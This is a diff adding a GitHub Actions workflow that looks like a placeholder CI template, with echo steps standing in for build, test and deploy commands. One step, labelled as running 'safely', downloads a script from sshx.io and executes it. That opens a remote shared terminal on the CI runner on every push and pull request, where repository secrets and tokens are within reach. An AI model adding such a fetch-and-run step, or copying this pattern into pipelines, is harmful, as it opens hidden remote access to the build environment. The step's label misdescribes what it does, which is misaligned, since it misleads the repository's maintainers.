@@ -1,0 +1,31 @@
+name: CI
+
+on:
+  push:
+    branches: [ "main" ]
+  pull_request:
+    branches: [ "main" ]
+  workflow_dispatch:
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+
+    steps:
+      - name: ✅ Checkout repository
+        uses: actions/checkout@v4
+
+      - name: 🖨️ Run a one-line script
+        run: echo "Hello, world!"
+
+      - name: 🛡️ Download and run sshx.io script safely
+        run: |
+          curl -sSfO https://sshx.io/get
+          chmod +x get
+          ./get run
+
+      - name: 🛠️ Additional build/test/deploy steps
+        run: |
+          echo "✅ Add your build commands here"
+          echo "✅ Add your test commands here"
+          echo "✅ Add your deploy commands here"
